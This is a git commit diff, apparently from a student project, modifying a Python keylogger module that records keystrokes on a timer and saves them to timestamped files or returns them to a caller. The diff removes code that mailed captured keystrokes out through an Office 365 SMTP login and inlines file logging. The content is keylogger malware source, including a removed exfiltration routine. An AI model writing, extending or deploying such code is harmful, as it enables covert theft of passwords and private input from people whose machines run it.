db653ad469c3221ce3d0341b948fb74bbf562c5e
Bert Van Itterbeeck <bert.vanitterbeeck@student.ap.be>
2022-12-31 00:16:16 +0100

    keylogger changes

--- modules/keylogger.py
+++ modules/keylogger.py
@@ -6,7 +6,8 @@ from datetime import datetime
 
 def run(**args):
     keylogger = Keylogger(interval= 60, report_method="file")
-    keylogger.start()
+    return keylogger.start()
+    
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -50,44 +51,16 @@ class Keylogger:
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
-    def report_to_file(self):
-        """This method creates a log file in the current directory that contains
-        the current keylogs in the `self.log` variable"""
-        # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
-            # write the keylogs to the file
-            print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
-
-    def sendmail(self, email, password, message, verbose=1):
-        # manages a connection to an SMTP server
-        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
-        server = smtplib.SMTP(host="smtp.office365.com", port=587)
-        # connect to the SMTP server as TLS mode ( for security )
-        server.starttls()
-        # login to the email account
-        server.login(email, password)
-        # send the actual message after preparation
-        server.sendmail(email, email, self.prepare_mail(message))
-        # terminates the session
-        server.quit()
-        if verbose:
-            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
-
     def report(self):
-        """
-        This function gets called every `self.interval`
-        It basically sends keylogs and resets `self.log` variable
-        """
         if self.log:
             # if there is something in log, report it
             self.end_dt = datetime.now()
             # update `self.filename`
             self.update_filename()
-            if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
-                self.report_to_file()
+            with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+                print(self.log, file=f)
+            print(f"[+] Saved {self.filename}.txt")
             # if you don't want to print in the console, comment below line
             print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
@@ -97,6 +70,7 @@ class Keylogger:
         timer.daemon = True
         # start the timer
         timer.start()
+        return self.log
 
     def start(self):
         # record the start datetime
